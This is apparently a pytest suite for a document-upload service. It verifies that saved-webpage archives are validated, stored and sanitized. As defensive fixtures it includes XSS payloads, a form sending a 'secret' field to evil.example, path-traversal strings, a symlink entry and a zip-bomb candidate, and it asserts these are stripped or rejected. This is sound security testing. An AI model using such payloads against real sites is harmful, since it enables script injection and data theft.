import hashlib
import io
import json
import os
import stat
import zipfile
from collections.abc import Generator
from pathlib import Path

import pytest
from fastapi.testclient import TestClient
from sqlalchemy import create_engine, select
from sqlalchemy.orm import Session, sessionmaker
from sqlalchemy.pool import StaticPool

os.environ["ADMIN_PASSWORD_HASH"] = "$2b$12$AVhh6Snv3FcaevOnJ0dwR.SfBrkaPp036/Nt/wwdVTsVQNuR1XKx2"
os.environ["SESSION_SECRET"] = "test-session-secret"
os.environ["DATABASE_URL"] = "sqlite+pysqlite:///:memory:"

from app.config import Settings, get_settings
from app.database import Base, get_db
from app.main import app
from app.models import IngestionEvent, IngestionJob, Source, Upload


SUPPORTED_FIXTURES = [
    ("sample.md", "text/markdown"),
    ("sample.markdown", "text/markdown"),
    ("sample.txt", "text/plain"),
    ("sample.html", "text/html"),
    ("sample.htm", "text/html"),
    ("sample.epub", "application/epub+zip"),
]


@pytest.fixture()
def db_session() -> Generator[Session, None, None]:
    engine = create_engine(
        "sqlite+pysqlite:///:memory:",
        connect_args={"check_same_thread": False},
        poolclass=StaticPool,
    )
    TestingSessionLocal = sessionmaker(bind=engine, autoflush=False, expire_on_commit=False)
    Base.metadata.create_all(bind=engine)

    db = TestingSessionLocal()
    try:
        yield db
    finally:
        db.close()


@pytest.fixture()
def client(tmp_path: Path, db_session: Session) -> Generator[TestClient, None, None]:
    def override_db() -> Generator[Session, None, None]:
        yield db_session

    def override_settings() -> Settings:
        return Settings(
            ADMIN_PASSWORD_HASH=os.environ["ADMIN_PASSWORD_HASH"],
            SESSION_SECRET=os.environ["SESSION_SECRET"],
            DATABASE_URL="sqlite+pysqlite:///:memory:",
            UPLOAD_DIR=str(tmp_path / "uploads"),
        )

    app.dependency_overrides[get_db] = override_db
    app.dependency_overrides[get_settings] = override_settings
    with TestClient(app) as test_client:
        assert test_client.post("/auth/login", json={"password": "admin-password"}).status_code == 200
        yield test_client
    app.dependency_overrides.clear()


@pytest.fixture()
def unauthenticated_client(tmp_path: Path, db_session: Session) -> Generator[TestClient, None, None]:
    def override_db() -> Generator[Session, None, None]:
        yield db_session

    def override_settings() -> Settings:
        return Settings(
            ADMIN_PASSWORD_HASH=os.environ["ADMIN_PASSWORD_HASH"],
            SESSION_SECRET=os.environ["SESSION_SECRET"],
            DATABASE_URL="sqlite+pysqlite:///:memory:",
            UPLOAD_DIR=str(tmp_path / "uploads"),
        )

    app.dependency_overrides[get_db] = override_db
    app.dependency_overrides[get_settings] = override_settings
    with TestClient(app) as test_client:
        yield test_client
    app.dependency_overrides.clear()


@pytest.mark.parametrize(("filename", "content_type"), SUPPORTED_FIXTURES)
def test_upload_supported_files_creates_raw_file_and_queued_job(
    client: TestClient,
    db_session: Session,
    filename: str,
    content_type: str,
) -> None:
    content = f"content for {filename}".encode()

    response = client.post("/uploads", files={"file": (filename, content, content_type)})

    assert response.status_code == 201
    payload = response.json()
    assert set(payload) == {"upload_id", "job_id", "queued"}
    assert payload["queued"] is True

    upload = db_session.get(Upload, payload["upload_id"])
    assert upload is not None
    assert upload.original_filename == filename
    assert upload.sha256 == hashlib.sha256(content).hexdigest()
    assert upload.size_bytes == len(content)
    assert Path(upload.stored_path).name == f"{upload.id}{Path(filename).suffix}"
    assert Path(upload.stored_path).read_bytes() == content

    job = db_session.get(IngestionJob, payload["job_id"])
    assert job is not None
    assert job.upload_id == upload.id
    assert job.status == "queued"

    event = db_session.scalars(select(IngestionEvent).where(IngestionEvent.ingestion_job_id == job.id)).one()
    assert event.event_type == "queued"


def test_upload_accepts_ddb_saved_html_through_generic_html_flow(client: TestClient, db_session: Session) -> None:
    fixture = Path(__file__).resolve().parent / "fixtures" / "ddb" / "a-world-of-your-own-ddb.html"
    content = fixture.read_bytes()

    response = client.post("/uploads", files={"file": ("ddb.html", content, "text/html")})

    assert response.status_code == 201
    payload = response.json()
    upload = db_session.get(Upload, payload["upload_id"])
    assert upload is not None
    assert upload.extension == ".html"
    assert Path(upload.stored_path).read_bytes() == content
    assert db_session.get(IngestionJob, payload["job_id"]).status == "queued"


@pytest.mark.parametrize(
    ("filename", "content_type"),
    [
        ("sample.pdf", "application/pdf"),
        ("sample.docx", "application/vnd.openxmlformats-officedocument.wordprocessingml.document"),
        ("sample.png", "image/png"),
        ("sample.bin", "application/octet-stream"),
    ],
)
def test_upload_rejects_unsupported_files(
    client: TestClient,
    db_session: Session,
    filename: str,
    content_type: str,
) -> None:
    response = client.post("/uploads", files={"file": (filename, b"unsupported", content_type)})

    assert response.status_code == 415
    assert response.json() == {"detail": "Unsupported file type. Supported types: ZIP, EPUB, HTML, TXT, MD."}
    assert db_session.scalars(select(Upload)).all() == []
    assert db_session.scalars(select(IngestionJob)).all() == []


def test_upload_rejects_supported_extension_with_wrong_content_type(client: TestClient) -> None:
    response = client.post("/uploads", files={"file": ("sample.md", b"markdown", "application/pdf")})

    assert response.status_code == 415
    assert response.json() == {"detail": "Unsupported file type. Supported types: ZIP, EPUB, HTML, TXT, MD."}


def test_upload_valid_webpage_archive_stores_immutable_source_archive(
    client: TestClient,
    db_session: Session,
    tmp_path: Path,
) -> None:
    content = _zip_bytes(
        {
            "page.html": b"<html><head><title>Archive</title></head><body><h1>Saved page</h1><p>Hello.</p></body></html>",
            "page_files/style.css": b"body { color: black; }",
            "page_files/image.png": b"\x89PNG\r\n\x1a\n",
        }
    )

    response = client.post("/uploads", files={"file": ("saved-page.zip", content, "application/zip")})

    assert response.status_code == 201
    payload = response.json()
    upload = db_session.get(Upload, payload["upload_id"])
    job = db_session.get(IngestionJob, payload["job_id"])
    assert upload is not None
    assert job is not None
    assert upload.original_filename == "saved-page.zip"
    assert upload.extension == ".html"
    assert upload.content_type == "application/zip"
    assert upload.sha256 == hashlib.sha256(content).hexdigest()

    job_metadata = json.loads(job.metadata_json)
    source_id = job_metadata["source_id"]
    archive_root = tmp_path / "uploads" / "source-archives" / source_id
    manifest_path = archive_root / "manifest.json"
    assert Path(upload.stored_path) == archive_root / "served" / "page.html"
    assert (archive_root / "original.zip").read_bytes() == content
    assert (archive_root / "original" / "page.html").read_bytes().startswith(b"<html>")
    served_text = Path(upload.stored_path).read_text(encoding="utf-8")
    assert "Hello." in served_text
    assert "data-source-chunk-id" in served_text
    assert (archive_root / "original" / "page_files" / "style.css").read_bytes() == b"body { color: black; }"
    assert manifest_path.exists()

    manifest = json.loads(manifest_path.read_text(encoding="utf-8"))
    assert manifest["source_id"] == source_id
    assert manifest["source_type"] == "archived_webpage"
    assert manifest["original_filename"] == "saved-page.zip"
    assert manifest["primary_html_path"] == "page.html"
    assert manifest["served_html_path"] == "page.html"
    assert manifest["anchor_map_path"] == "anchor-map.json"
    assert manifest["original_sha256"] == hashlib.sha256(content).hexdigest()
    assert manifest["file_count"] == 3
    assert manifest["extracted_size_bytes"] == sum(entry["size_bytes"] for entry in manifest["entries"])
    assert {entry["path"] for entry in manifest["entries"]} == {
        "page.html",
        "page_files/style.css",
        "page_files/image.png",
    }
    assert (archive_root / "served" / "page.html").exists()
    assert (archive_root / "anchor-map.json").exists()


def test_archive_job_metadata_becomes_ingested_source_metadata(client: TestClient, db_session: Session) -> None:
    content = _zip_bytes({"page.html": b"<html><body><h1>Saved page</h1><p>Hello archive.</p></body></html>"})
    response = client.post("/uploads", files={"file": ("saved-page.zip", content, "application/zip")})
    assert response.status_code == 201
    payload = response.json()
    job = db_session.get(IngestionJob, payload["job_id"])
    assert job is not None
    source_id = json.loads(job.metadata_json)["source_id"]

    from app.ingestion import process_claimed_job

    processed = process_claimed_job(db_session, job.id, continue_to_index=False)

    assert processed.status == "awaiting_embedding"
    source = db_session.get(Source, source_id)
    assert source is not None
    assert source.source_type == "archived_webpage"
    source_metadata = json.loads(source.metadata_json)
    assert source_metadata["archive_primary_html_path"] == "page.html"
    assert source_metadata["archive_entry_path"] == "page.html"
    assert source_metadata["archive_served_html_path"] == "page.html"
    assert source_metadata["archive_served_entry_path"] == "page.html"
    assert source_metadata["archive_anchor_map_path"] == "anchor-map.json"
    assert source_metadata["archive_file_count"] == 1


def test_archive_served_html_rewrites_assets_and_creates_anchor_map(
    client: TestClient,
    db_session: Session,
    tmp_path: Path,
) -> None:
    original_html = b"""
    <html>
      <head><title>Archive</title><link rel="stylesheet" href="page_files/style.css"></head>
      <body>
        <h1>Saved page</h1>
        <p>Hello archive citation.</p>
        <img src="page_files/image.png" alt="local image">
      </body>
    </html>
    """
    content = _zip_bytes(
        {
            "page.html": original_html,
            "page_files/style.css": b"body { color: black; }",
            "page_files/image.png": b"\x89PNG\r\n\x1a\n",
        }
    )

    response = client.post("/uploads", files={"file": ("saved-page.zip", content, "application/zip")})

    assert response.status_code == 201
    job = db_session.get(IngestionJob, response.json()["job_id"])
    assert job is not None
    source_id = json.loads(job.metadata_json)["source_id"]
    archive_root = tmp_path / "uploads" / "source-archives" / source_id
    served_html = (archive_root / "served" / "page.html").read_text(encoding="utf-8")
    anchor_map = json.loads((archive_root / "anchor-map.json").read_text(encoding="utf-8"))

    assert (archive_root / "original" / "page.html").read_bytes() == original_html
    assert f'/records/sources/{source_id}/archive/assets/page_files/style.css' in served_html
    assert f'/records/sources/{source_id}/archive/assets/page_files/image.png' in served_html
    assert 'data-source-chunk-id="' in served_html
    assert anchor_map["source_path"] == "page.html"
    assert len(anchor_map["anchors"]) == 1
    anchor = anchor_map["anchors"][0]
    assert anchor["heading_path"] == ["Saved page"]
    assert anchor["quote"] == "Hello archive citation."
    assert anchor["source_path"] == "page.html"
    assert anchor["viewer_fragment"].startswith("#source-chunk-")
    assert anchor["selector"].startswith('[data-source-chunk-id="archive-')

    from app.ingestion import process_claimed_job

    process_claimed_job(db_session, job.id, continue_to_index=False)

    asset_response = client.get(f"/records/sources/{source_id}/archive/assets/page_files/style.css")
    assert asset_response.status_code == 200
    assert asset_response.text == "body { color: black; }"


def test_upload_allows_macos_ds_store_archive_entries(
    client: TestClient,
    db_session: Session,
    tmp_path: Path,
) -> None:
    content = _zip_bytes(
        {
            "A/.DS_Store": b"mac metadata",
            "A/page.html": b"<html><body><h1>Saved page</h1><p>Hello archive.</p></body></html>",
        }
    )

    response = client.post("/uploads", files={"file": ("saved-page.zip", content, "application/zip")})

    assert response.status_code == 201
    job = db_session.get(IngestionJob, response.json()["job_id"])
    assert job is not None
    source_id = json.loads(job.metadata_json)["source_id"]
    archive_root = tmp_path / "uploads" / "source-archives" / source_id
    assert (archive_root / "original" / "A" / ".DS_Store").read_bytes() == b"mac metadata"

    manifest = json.loads((archive_root / "manifest.json").read_text(encoding="utf-8"))
    manifest_entry = next(entry for entry in manifest["entries"] if entry["path"] == "A/.DS_Store")
    assert manifest_entry["mime_type"] == "application/octet-stream"


def test_upload_allows_extensionless_browser_saved_assets(
    client: TestClient,
    db_session: Session,
    tmp_path: Path,
) -> None:
    content = _zip_bytes(
        {
            "Introduction/page.html": b'<html><body><h1>Introduction</h1><p>Saved archive text.</p><a href="page_files/species">Species</a></body></html>',
            "Introduction/page_files/species": b'{"kind":"route-manifest"}',
        }
    )

    response = client.post("/uploads", files={"file": ("Introduction.zip", content, "application/zip")})

    assert response.status_code == 201
    job = db_session.get(IngestionJob, response.json()["job_id"])
    assert job is not None
    source_id = json.loads(job.metadata_json)["source_id"]
    archive_root = tmp_path / "uploads" / "source-archives" / source_id
    assert (archive_root / "original" / "Introduction" / "page_files" / "species").read_bytes() == b'{"kind":"route-manifest"}'

    manifest = json.loads((archive_root / "manifest.json").read_text(encoding="utf-8"))
    manifest_entry = next(entry for entry in manifest["entries"] if entry["path"] == "Introduction/page_files/species")
    assert manifest_entry["mime_type"] == "application/octet-stream"

    from app.ingestion import process_claimed_job

    process_claimed_job(db_session, job.id, continue_to_index=False)

    asset_response = client.get(f"/records/sources/{source_id}/archive/assets/Introduction/page_files/species")
    assert asset_response.status_code == 200
    assert asset_response.headers["content-type"].startswith("application/octet-stream")
    assert asset_response.content == b'{"kind":"route-manifest"}'


def test_archive_viewer_and_assets_require_authentication(unauthenticated_client: TestClient) -> None:
    viewer_response = unauthenticated_client.get("/records/sources/source-id/archive/viewer")
    asset_response = unauthenticated_client.get("/records/sources/source-id/archive/assets/page_files/style.css")

    assert viewer_response.status_code == 401
    assert asset_response.status_code == 401


def test_archive_viewer_serves_sanitized_html_with_target_highlight_and_iframe_headers(
    client: TestClient,
    db_session: Session,
    tmp_path: Path,
) -> None:
    source_id = _upload_and_ingest_archive(
        client,
        db_session,
        {
            "page.html": b"""
            <html>
              <head><title>Archive</title></head>
              <body onload="steal()">
                <h1>Saved page</h1>
                <script>alert('x')</script>
                <p onclick="steal()">Hello archive citation.</p>
              </body>
            </html>
            """,
        },
    )
    anchor_map = json.loads((tmp_path / "uploads" / "source-archives" / source_id / "anchor-map.json").read_text(encoding="utf-8"))
    chunk_id = anchor_map["anchors"][0]["chunk_id"]

    response = client.get(f"/records/sources/{source_id}/archive/viewer", params={"target": chunk_id})

    assert response.status_code == 200
    assert response.headers["content-type"].startswith("text/html")
    assert response.headers["x-frame-options"] == "SAMEORIGIN"
    assert response.headers["content-security-policy"] == "frame-ancestors 'self'"
    assert "Hello archive citation." in response.text
    assert "archive-target-highlight" in response.text
    assert f"url=#{chunk_id}" in response.text
    assert "<script" not in response.text.lower()
    assert "onclick" not in response.text.lower()
    assert str(tmp_path) not in response.text


def test_archive_asset_route_serves_local_assets_with_mime_and_iframe_headers(
    client: TestClient,
    db_session: Session,
) -> None:
    source_id = _upload_and_ingest_archive(
        client,
        db_session,
        {
            "page.html": b"""
            <html>
              <head><link rel="stylesheet" href="page_files/style.css"></head>
              <body><h1>Saved page</h1><p>Hello.</p><img src="page_files/image.png"></body>
            </html>
            """,
            "page_files/style.css": b"body { color: black; }",
            "page_files/image.png": b"\x89PNG\r\n\x1a\n",
        },
    )

    css_response = client.get(f"/records/sources/{source_id}/archive/assets/page_files/style.css")
    image_response = client.get(f"/records/sources/{source_id}/archive/assets/page_files/image.png")

    assert css_response.status_code == 200
    assert css_response.headers["content-type"].startswith("text/css")
    assert css_response.headers["x-frame-options"] == "SAMEORIGIN"
    assert css_response.headers["content-security-policy"] == "frame-ancestors 'self'"
    assert css_response.text == "body { color: black; }"
    assert image_response.status_code == 200
    assert image_response.headers["content-type"].startswith("image/png")
    assert image_response.content == b"\x89PNG\r\n\x1a\n"


@pytest.mark.parametrize(
    ("url", "expected_status"),
    [
        ("/records/sources/{source_id}/archive/viewer?path=../original/page.html", 400),
        ("/records/sources/{source_id}/archive/viewer?path=page_files/style.css", 400),
        ("/records/sources/{source_id}/archive/assets/%2E%2E/page.html", 400),
        ("/records/sources/{source_id}/archive/assets/page.html", 400),
        ("/records/sources/{source_id}/archive/assets/page_files", 404),
        ("/records/sources/unknown-source/archive/viewer", 404),
    ],
)
def test_archive_viewer_and_asset_routes_reject_traversal_unknown_sources_and_directories(
    client: TestClient,
    db_session: Session,
    tmp_path: Path,
    url: str,
    expected_status: int,
) -> None:
    source_id = _upload_and_ingest_archive(
        client,
        db_session,
        {
            "page.html": b"<html><body><h1>Saved page</h1><p>Hello.</p></body></html>",
            "page_files/style.css": b"body { color: black; }",
        },
    )

    response = client.get(url.format(source_id=source_id))

    assert response.status_code == expected_status
    assert str(tmp_path) not in response.text


def test_records_job_and_chunk_metadata_do_not_expose_archive_filesystem_paths(
    client: TestClient,
    db_session: Session,
    tmp_path: Path,
) -> None:
    source_id = _upload_and_ingest_archive(
        client,
        db_session,
        {"page.html": b"<html><body><h1>Saved page</h1><p>Hello archive citation.</p></body></html>"},
    )

    jobs_response = client.get("/records/jobs")
    chunks_response = client.get("/records/chunks")

    assert jobs_response.status_code == 200
    assert chunks_response.status_code == 200
    response_text = json.dumps({"jobs": jobs_response.json(), "chunks": chunks_response.json()})
    assert str(tmp_path) not in response_text
    assert "/data/uploads" not in response_text
    assert "original.zip" not in response_text
    assert "archive_original_zip_path" not in response_text
    assert "archive_original_dir" not in response_text
    assert "archive_manifest_path" not in response_text

    archive_job = next(job for job in jobs_response.json() if job["metadata"].get("source_id") == source_id)
    archive_chunk = next(chunk for chunk in chunks_response.json() if chunk["metadata"].get("archive_source_id") == source_id)
    assert archive_job["metadata"]["archive_entry_path"] == "page.html"
    assert archive_job["metadata"]["archive_served_entry_path"] == "page.html"
    assert archive_job["metadata"]["archive_anchor_map_path"] == "anchor-map.json"
    assert archive_chunk["metadata"]["archive_entry_path"] == "page.html"
    assert archive_chunk["metadata"]["archive_served_entry_path"] == "page.html"
    assert archive_chunk["metadata"]["target_chunk_id"].startswith("archive-")


def test_archive_served_html_strips_dangerous_content_and_external_references(
    client: TestClient,
    db_session: Session,
    tmp_path: Path,
) -> None:
    original_html = b"""
    <html>
      <body onload="steal()">
        <h1>Unsafe page</h1>
        <script>alert('x')</script>
        <form action="https://evil.example/post"><input name="secret"></form>
        <p onclick="steal()"><a href="javascript:alert(1)">Bad link</a> Safe text.</p>
        <img src="https://evil.example/pixel.png" onerror="steal()">
      </body>
    </html>
    """

    response = client.post("/uploads", files={"file": ("unsafe.zip", _zip_bytes({"page.html": original_html}), "application/zip")})

    assert response.status_code == 201
    job = db_session.get(IngestionJob, response.json()["job_id"])
    assert job is not None
    source_id = json.loads(job.metadata_json)["source_id"]
    archive_root = tmp_path / "uploads" / "source-archives" / source_id
    served_html = (archive_root / "served" / "page.html").read_text(encoding="utf-8")

    assert (archive_root / "original" / "page.html").read_bytes() == original_html
    assert "<script" not in served_html.lower()
    assert "onclick" not in served_html.lower()
    assert "onload" not in served_html.lower()
    assert "onerror" not in served_html.lower()
    assert "javascript:" not in served_html.lower()
    assert "evil.example" not in served_html
    assert "<form" not in served_html.lower()
    assert "data-source-chunk-id" in served_html


@pytest.mark.parametrize(
    ("entries", "expected_detail"),
    [
        ({"../evil.html": b"<html></html>"}, "unsafe entry path"),
        ({"/evil.html": b"<html></html>"}, "unsafe entry path"),
        ({"assets/file.exe": b"not allowed", "page.html": b"<html></html>"}, "disallowed extension"),
        ({"A/.env": b"not allowed", "page.html": b"<html></html>"}, "disallowed extension"),
        ({"assets/style.css": b"body{}"}, "exactly one HTML"),
        ({"a.html": b"<html></html>", "b.htm": b"<html></html>"}, "multiple HTML"),
    ],
)
def test_upload_rejects_malicious_or_ambiguous_archives(
    client: TestClient,
    db_session: Session,
    tmp_path: Path,
    entries: dict[str, bytes],
    expected_detail: str,
) -> None:
    response = client.post("/uploads", files={"file": ("bad.zip", _zip_bytes(entries), "application/zip")})

    assert response.status_code == 400
    assert expected_detail in response.json()["detail"]
    assert db_session.scalars(select(Upload)).all() == []
    assert db_session.scalars(select(IngestionJob)).all() == []
    assert not (tmp_path / "uploads" / "source-archives").exists()
    assert not (tmp_path / "evil.html").exists()


def test_upload_rejects_archive_symlink(client: TestClient, db_session: Session, tmp_path: Path) -> None:
    response = client.post("/uploads", files={"file": ("bad.zip", _zip_with_symlink(), "application/zip")})

    assert response.status_code == 400
    assert "symbolic link" in response.json()["detail"]
    assert db_session.scalars(select(Upload)).all() == []
    assert db_session.scalars(select(IngestionJob)).all() == []
    assert not (tmp_path / "uploads" / "source-archives").exists()


def test_upload_rejects_archive_with_too_many_files(client: TestClient, db_session: Session, tmp_path: Path) -> None:
    entries = {"page.html": b"<html></html>"}
    entries.update({f"assets/{index}.txt": b"x" for index in range(2000)})

    response = client.post("/uploads", files={"file": ("bad.zip", _zip_bytes(entries), "application/zip")})

    assert response.status_code == 400
    assert "too many files" in response.json()["detail"]
    assert db_session.scalars(select(Upload)).all() == []
    assert db_session.scalars(select(IngestionJob)).all() == []
    assert not (tmp_path / "uploads" / "source-archives").exists()


def test_upload_rejects_oversized_archive_zip(client: TestClient, db_session: Session, tmp_path: Path) -> None:
    def override_settings() -> Settings:
        return Settings(
            ADMIN_PASSWORD_HASH=os.environ["ADMIN_PASSWORD_HASH"],
            SESSION_SECRET=os.environ["SESSION_SECRET"],
            DATABASE_URL="sqlite+pysqlite:///:memory:",
            UPLOAD_DIR=str(tmp_path / "uploads"),
            ARCHIVE_MAX_ZIP_SIZE_BYTES=10,
        )

    app.dependency_overrides[get_settings] = override_settings

    response = client.post("/uploads", files={"file": ("bad.zip", _zip_bytes({"page.html": b"<html></html>"}), "application/zip")})

    assert response.status_code == 400
    assert "maximum allowed size" in response.json()["detail"]
    assert db_session.scalars(select(Upload)).all() == []
    assert db_session.scalars(select(IngestionJob)).all() == []
    assert not (tmp_path / "uploads" / "source-archives").exists()


def test_upload_rejects_archive_with_oversized_extracted_content(
    client: TestClient,
    db_session: Session,
    tmp_path: Path,
) -> None:
    def override_settings() -> Settings:
        return Settings(
            ADMIN_PASSWORD_HASH=os.environ["ADMIN_PASSWORD_HASH"],
            SESSION_SECRET=os.environ["SESSION_SECRET"],
            DATABASE_URL="sqlite+pysqlite:///:memory:",
            UPLOAD_DIR=str(tmp_path / "uploads"),
            ARCHIVE_MAX_EXTRACTED_SIZE_BYTES=10,
        )

    app.dependency_overrides[get_settings] = override_settings

    response = client.post("/uploads", files={"file": ("bad.zip", _zip_bytes({"page.html": b"<html></html>"}), "application/zip")})

    assert response.status_code == 400
    assert "extracted content exceeds" in response.json()["detail"]
    assert db_session.scalars(select(Upload)).all() == []
    assert db_session.scalars(select(IngestionJob)).all() == []
    assert not (tmp_path / "uploads" / "source-archives").exists()


def test_upload_rejects_zip_bomb_candidate(client: TestClient, db_session: Session, tmp_path: Path) -> None:
    response = client.post("/uploads", files={"file": ("bad.zip", _zip_bytes({"page.html": b"a" * 200_000}), "application/zip")})

    assert response.status_code == 400
    assert "unsafe compression ratio" in response.json()["detail"]
    assert db_session.scalars(select(Upload)).all() == []
    assert db_session.scalars(select(IngestionJob)).all() == []
    assert not (tmp_path / "uploads" / "source-archives").exists()


def test_upload_is_observable_through_list_and_detail_endpoints(client: TestClient) -> None:
    response = client.post("/uploads", files={"file": ("sample.md", b"# Notes", "text/markdown")})
    assert response.status_code == 201
    upload_id = response.json()["upload_id"]

    list_response = client.get("/records/uploads")
    detail_response = client.get(f"/records/uploads/{upload_id}")

    assert list_response.status_code == 200
    assert list_response.json()[0]["id"] == upload_id
    assert detail_response.status_code == 200
    assert detail_response.json()["id"] == upload_id
    assert detail_response.json()["original_filename"] == "sample.md"


def test_upload_requires_authentication() -> None:
    with TestClient(app) as unauthenticated_client:
        response = unauthenticated_client.post("/uploads", files={"file": ("sample.md", b"markdown", "text/markdown")})

    assert response.status_code == 401


def _zip_bytes(entries: dict[str, bytes]) -> bytes:
    archive = io.BytesIO()
    with zipfile.ZipFile(archive, "w", zipfile.ZIP_DEFLATED) as zip_file:
        for name, content in entries.items():
            zip_file.writestr(name, content)
    return archive.getvalue()


def _upload_and_ingest_archive(client: TestClient, db_session: Session, entries: dict[str, bytes]) -> str:
    response = client.post("/uploads", files={"file": ("saved-page.zip", _zip_bytes(entries), "application/zip")})
    assert response.status_code == 201
    job = db_session.get(IngestionJob, response.json()["job_id"])
    assert job is not None
    source_id = json.loads(job.metadata_json)["source_id"]

    from app.ingestion import process_claimed_job

    processed = process_claimed_job(db_session, job.id, continue_to_index=False)
    assert processed.status == "awaiting_embedding"
    return source_id


def _zip_with_symlink() -> bytes:
    archive = io.BytesIO()
    with zipfile.ZipFile(archive, "w", zipfile.ZIP_DEFLATED) as zip_file:
        link = zipfile.ZipInfo("link.html")
        link.external_attr = (stat.S_IFLNK | 0o777) << 16
        zip_file.writestr(link, "target.html")
    return archive.getvalue()
